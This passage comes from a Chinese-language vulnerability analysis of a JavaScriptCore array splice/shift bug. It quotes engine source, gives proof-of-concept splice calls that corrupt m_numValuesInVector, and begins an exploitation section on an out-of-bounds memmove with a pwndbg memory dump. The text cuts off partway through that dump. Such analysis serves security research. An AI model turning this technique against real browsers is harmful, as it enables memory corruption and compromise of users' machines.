&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RETURN_IF_EXCEPTION(scope, void());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!success) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throwTypeError(exec, scope, UnableToDeletePropertyError);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for (unsigned k = length; k &gt; length - count; --k) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bool success = thisObj-&gt;methodTable(vm)-&gt;deletePropertyByIndex(thisObj, exec, k - 1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RETURN_IF_EXCEPTION(scope, void());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!success) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throwTypeError(exec, scope, UnableToDeletePropertyError);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">JSArray::ShiftCountForSplice` </span><span class="cs7FFD2630">实现在</span><span class="cs9FB05234">`Source/JavaScriptCore/runtime/JSArray.h:125`, `shiftCountWithAnyIndexingType` </span><span class="cs7FFD2630">根据</span><span class="cs9FB05234"> array </span><span class="cs7FFD2630">的类型做不同的处理，这里我们是</span><span class="cs9FB05234">`ArrayWithArrayStorage`, </span><span class="cs7FFD2630">直接调用</span><span class="cs9FB05234">`shiftCountWithArrayStorage</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">bool shiftCountForSplice(ExecState* exec, unsigned&amp; startIndex, unsigned count) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return shiftCountWithAnyIndexingType(exec, startIndex, count); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">//.................</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">bool JSArray::shiftCountWithAnyIndexingType(ExecState* exec, unsigned&amp; startIndex, unsigned count)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;VM&amp; vm = exec-&gt;vm();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;RELEASE_ASSERT(count &gt; 0);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ensureWritable(vm);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Butterfly* butterfly = this-&gt;butterfly();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;switch (indexingType()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;case ArrayClass:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return true;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;case ArrayWithUndecided:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Don&#39;t handle this because it&#39;s confusing and it shouldn&#39;t come up.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;case ArrayWithInt32:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;case ArrayWithContiguous: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unsigned oldLength = butterfly-&gt;publicLength();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;case ArrayWithDouble: {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unsigned oldLength = butterfly-&gt;publicLength();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RELEASE_ASSERT(count &lt;= oldLength);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;case ArrayWithArrayStorage:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;case ArrayWithSlowPutArrayStorage:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return shiftCountWithArrayStorage(vm, startIndex, count, arrayStorage());</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;default:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CRASH();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里就是漏洞点了，前面提到</span><span class="cs9FB05234">holesMustForwardToPrototype</span><span class="cs8926E06"> </span><span class="cs9C1B1871">会返回</span><span class="cs8926E06">false, </span><span class="cs9C1B1871">这样就会进入到后面的逻辑</span></p><p class="cs3A447A38"><span class="cs9FB05234">bool JSArray::shiftCountWithArrayStorage(VM&amp; vm, unsigned startIndex, unsigned count, ArrayStorage* storage)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;unsigned oldLength = storage-&gt;length();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;RELEASE_ASSERT(count &lt;= oldLength);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// If the array contains holes or is otherwise in an abnormal state,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// use the generic algorithm in ArrayPrototype.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ((storage-&gt;hasHoles() &amp;&amp; this-&gt;structure(vm)-&gt;holesMustForwardToPrototype(vm, this)) </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|| hasSparseMap() </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|| shouldUseSlowPut(indexingType())) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (!oldLength)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//count = 0x11, oldlength = 0x100000, length = 0xfffef</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;unsigned length = oldLength - count;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// m_numValuesInVector = 1, </span><span class="cs7FFD2630">计算之后</span><span class="cs9FB05234"> m_numValuesInVector = 0xfffffff0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;storage-&gt;m_numValuesInVector -= count;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;storage-&gt;setLength(length);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里运行结束后</span><span class="cs9FB05234">a.length = 0xfffef</span><span class="cs8926E06">, </span><span class="cs9FB05234">storage.m_numValuesInVector = 0xfffffff0</span><span class="cs8926E06">, </span><span class="cs9C1B1871">然后</span><span class="cs8926E06"> poc </span><span class="cs9C1B1871">下一步设置</span><span class="cs9FB05234">a.length = 0xfffffff0</span><span class="cs8926E06">, </span><span class="cs9C1B1871">这样就有</span><span class="cs8926E06"> </span><span class="cs9FB05234">a.length == storage.m_numValuesInVector</span><span class="cs8926E06">, </span><span class="cs9C1B1871">这样</span><span class="cs9FB05234">hasHoles</span><span class="cs8926E06"> </span><span class="cs9C1B1871">后续都会返回</span><span class="cs8926E06">false</span></p><p class="cs3A447A38"><span class="cs9FB05234">bool hasHoles() const &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return m_numValuesInVector != length(); &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最后一步</span><span class="cs9FB05234">a.splice(0xfffffff0, 0, 1);</span><span class="cs8926E06">, </span><span class="cs9FB05234">itemCount == 1 &gt; actualDeleteCount == 0</span><span class="cs8926E06">, </span><span class="cs9C1B1871">于是就会进入</span><span class="cs8926E06"> </span><span class="cs9FB05234">unshift</span><span class="cs8926E06"> </span><span class="cs9C1B1871">函数，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> shift </span><span class="cs9C1B1871">函数类似，这里最终会进入</span><span class="cs8926E06"> </span><span class="cs9FB05234">JSArray</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的</span><span class="cs9FB05234">unshiftCountWithArrayStorage</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因为</span><span class="cs8926E06"> </span><span class="cs9FB05234">storage-&gt;hasHoles()</span><span class="cs8926E06"> </span><span class="cs9C1B1871">返回的是</span><span class="cs8926E06"> false, </span><span class="cs9C1B1871">所以可以进入后面的判断，要添加的</span><span class="cs8926E06">item </span><span class="cs9C1B1871">比</span><span class="cs8926E06"> delete</span><span class="cs9C1B1871">的多，那么就需要扩大原来的内存，后续的内存操作会出现问题，最终</span><span class="cs9FB05234">segmentfault</span></p><p class="cs3A447A38"><span class="cs9FB05234">bool JSArray::unshiftCountWithArrayStorage(ExecState* exec, unsigned startIndex, unsigned count, ArrayStorage* storage)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">//..</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// If the array contains holes or is otherwise in an abnormal state,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// use the generic algorithm in ArrayPrototype.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (storage-&gt;hasHoles() || storage-&gt;inSparseMode() || shouldUseSlowPut(indexingType()))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;bool moveFront = !startIndex || startIndex &lt; length / 2;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;unsigned vectorLength = storage-&gt;vectorLength();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// Need to have GC deferred around the unshiftCountSlowCase(), since that leaves the butterfly in</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// a weird state: some parts of it will be left uninitialized, which we will fill in here.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;DeferGC deferGC(vm.heap);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;auto locker = holdLock(cellLock());</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (moveFront &amp;&amp; storage-&gt;m_indexBias &gt;= count) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Butterfly* newButterfly = storage-&gt;butterfly()-&gt;unshift(structure(vm), count);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;storage = newButterfly-&gt;arrayStorage();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;storage-&gt;m_indexBias -= count;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;storage-&gt;setVectorLength(vectorLength + count);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setButterfly(vm, newButterfly);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else if (!moveFront &amp;&amp; vectorLength - length &gt;= count)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;storage = storage-&gt;butterfly()-&gt;arrayStorage();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else if (unshiftCountSlowCase(locker, vm, deferGC, moveFront, count))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;storage = arrayStorage();// 0x60 </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throwOutOfMemoryError(exec, scope);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;WriteBarrier&lt;Unknown&gt;* vector = storage-&gt;m_vector;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (startIndex) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (moveFront)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memmove(vector, vector + count, startIndex * sizeof(JSValue));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else if (length - startIndex)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memmove(vector + startIndex + count, vector + startIndex, (length - startIndex) * sizeof(JSValue));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for (unsigned i = 0; i &lt; count; i++)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vector[i + startIndex].clear();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><h3 class="cs868C439D">
			<a name="漏洞利用"><span class="csD6CA00D2">漏洞利用</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">okay</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">漏洞发生的原因大概清楚了，我们再来看看要怎么样利用。我们可以发现</span><span class="cs8926E06"> </span><span class="cs9FB05234">unshiftCountWithArrayStorage</span><span class="cs8926E06"> </span><span class="cs9C1B1871">有一个</span><span class="cs8926E06"> </span><span class="cs9FB05234">memmove</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的操作，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">假如执行</span><span class="cs9FB05234">a.splice(0x1000,0,1)</span><span class="cs8926E06">, </span><span class="cs9FB05234">startIndex == 0x1000</span><span class="cs8926E06">, </span><span class="cs9FB05234">moveFront == true</span><span class="cs8926E06"> , </span><span class="cs9FB05234">count = 1</span></p><p class="cs3A447A38"><span class="cs9FB05234">if (startIndex) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (moveFront)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memmove(vector, vector + count, startIndex * sizeof(JSValue));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else if (length - startIndex)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memmove(vector + startIndex + count, vector + startIndex, (length - startIndex) * sizeof(JSValue));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">vector </span><span class="cs9C1B1871">来自前面的</span><span class="cs9FB05234">storage</span><span class="cs8926E06"> , </span><span class="cs9C1B1871">这里会进入</span><span class="cs8926E06"> </span><span class="cs9FB05234">storage = arrayStorage();</span><span class="cs8926E06"> </span><span class="cs9C1B1871">重新初始化一个</span><span class="cs8926E06"> storage, </span><span class="cs9C1B1871">可以跟踪一下</span><span class="cs9FB05234">Source/JavaScriptCore/runtime/ButterflyInlines.h:77</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的</span><span class="cs9FB05234">Butterfly::tryCreateUninitialized</span><span class="cs8926E06"> </span><span class="cs9C1B1871">函数，最终分配的内存大小是</span><span class="cs8926E06"> 0x60(0x58 </span><span class="cs9C1B1871">向上对齐</span><span class="cs8926E06">)</span><span class="cs9C1B1871">。但是</span><span class="cs8926E06"> </span><span class="cs9C1B1871">因为这里</span><span class="cs9FB05234">startIndex</span><span class="cs8926E06"> </span><span class="cs9C1B1871">可以控制，于是这里就可以越界做内存拷贝。</span></p><p class="cs3A447A38"><span class="cs9FB05234">if (moveFront &amp;&amp; storage-&gt;m_indexBias &gt;= count) {//m_indexBias ==0 &lt; count ==1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Butterfly* newButterfly = storage-&gt;butterfly()-&gt;unshift(structure(vm), count);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;storage = newButterfly-&gt;arrayStorage();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;storage-&gt;m_indexBias -= count;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;storage-&gt;setVectorLength(vectorLength + count);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setButterfly(vm, newButterfly);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else if (!moveFront &amp;&amp; vectorLength - length &gt;= count)// moveFront == true</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;storage = storage-&gt;butterfly()-&gt;arrayStorage();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else if (unshiftCountSlowCase(locker, vm, deferGC, moveFront, count))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;storage = arrayStorage();// 0x60 </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throwOutOfMemoryError(exec, scope);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;WriteBarrier&lt;Unknown&gt;* vector = storage-&gt;m_vector;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果内存布局像下面这样</span><span class="cs8926E06">,</span></p><p class="cs3A447A38"><span class="cs9FB05234">vector = 0x7fe000287a78</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">pwndbg&gt; x/1000gx 0x7fe000287a78</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7fe000287a78: 0x00000000badbeef0 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0000000000000000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7fe000287a88: 0x00000000badbeef0 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000badbeef0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7fe000287a98: 0x00000000badbeef0 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x00000000badbeef0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">//..</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// </span><span class="cs7FFD2630">其他</span><span class="cs9FB05234"> object </span><span class="cs7FFD2630">的</span><span class="cs9FB05234"> butterfly, &nbsp;length = 0xa</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7fe000287ff8: 0x00000000badbeef0 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x0000000d0000000a</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x7fe000288008: 0x0000000000001337 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x402abd70a3d70a3d</span><span 